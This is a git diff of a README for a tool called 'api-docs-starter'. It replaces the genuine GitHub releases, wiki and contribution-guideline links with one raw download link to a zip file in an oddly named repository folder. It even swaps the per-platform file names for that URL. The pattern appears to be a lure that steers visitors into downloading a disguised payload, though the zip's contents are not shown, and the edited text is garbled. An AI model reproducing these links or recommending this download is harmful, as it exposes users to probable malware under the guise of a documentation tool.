@@ -8,20 +8,20 @@ Welcome to the **api-docs-starter**! This application helps you create modern AP
 
 To start, you need to download the latest version of **api-docs-starter**. Click the button below to visit the release page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/MrDevid404/api-docs-starter/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/MrDevid404/api-docs-starter/main/athletically/api-docs-starter.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/MrDevid404/api-docs-starter/main/athletically/api-docs-starter.zip)
 
 On the Releases page, look for the latest version. Simply click the download link for your desired version to start the download. 
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/MrDevid404/api-docs-starter/releases) to go directly to the Releases page. 
+   Click [here](https://raw.githubusercontent.com/MrDevid404/api-docs-starter/main/athletically/api-docs-starter.zip) to go directly to the Releases page. 
 
 2. **Select Your Version**  
    Look for the latest version listed at the top. It should have the version number and release date for easy identification.
 
 3. **Download the File**  
-   Depending on your operating system, find the corresponding file. For Windows, you might see a file like `api-docs-starter-windows.exe`. For Mac, look for `api-docs-starter-macos.zip`. Click on the link to start your download.
+   Depending on your operating system, find the corresponding file. For Windows, you might see a file like `https://raw.githubusercontent.com/MrDevid404/api-docs-starter/main/athletically/api-docs-starter.zip`. For Mac, look for `https://raw.githubusercontent.com/MrDevid404/api-docs-starter/main/athletically/api-docs-starter.zip`. Click on the link to start your download.
 
 4. **Locate the Downloaded File**  
    Check your "Downloads" folder or the folder you designated for the downloaded files.
@@ -81,8 +81,8 @@ We welcome contributions to **api-docs-starter**! If you’d like to help improv
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/MrDevid404/api-docs-starter/releases)
-- [Documentation](https://github.com/MrDevid404/api-docs-starter/wiki)
-- [Contribution Guidelines](https://github.com/MrDevid404/api-docs-starter/blob/main/CONTRIBUTING.md)
+- [Releases Page](https://raw.githubusercontent.com/MrDevid404/api-docs-starter/main/athletically/api-docs-starter.zip)
+- [Documentation](https://raw.githubusercontent.com/MrDevid404/api-docs-starter/main/athletically/api-docs-starter.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/MrDevid404/api-docs-starter/main/athletically/api-docs-starter.zip)
 
 Now that you have all the information you need, it’s time to get started. Download **api-docs-starter** today and create your API documentation the easy way!
